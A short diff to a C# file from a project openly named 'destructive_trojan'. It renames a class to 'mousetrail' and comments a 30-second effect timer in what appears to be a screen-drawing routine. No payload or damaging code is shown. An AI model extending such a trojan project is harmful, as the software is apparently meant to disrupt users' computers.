@@ -11,7 +11,7 @@ using System.Diagnostics;
 
 namespace destructive_trojan
 {
-    public class Class1
+    public class mousetrail
     {
         [DllImport("Shell32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, ExactSpelling = true,
         CallingConvention = CallingConvention.StdCall)]
@@ -202,7 +202,7 @@ namespace destructive_trojan
         {
             Thread.Sleep(50);
             DateTime startTime = DateTime.Now;
-            TimeSpan maxDuration = TimeSpan.FromSeconds(30);
+            TimeSpan maxDuration = TimeSpan.FromSeconds(30); //Duration of effect
             Random r;
             int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height;
             int left = Screen.PrimaryScreen.Bounds.Left, right = Screen.PrimaryScreen.Bounds.Right, top = Screen.PrimaryScreen.Bounds.Top, bottom = Screen.PrimaryScreen.Bounds.Bottom;
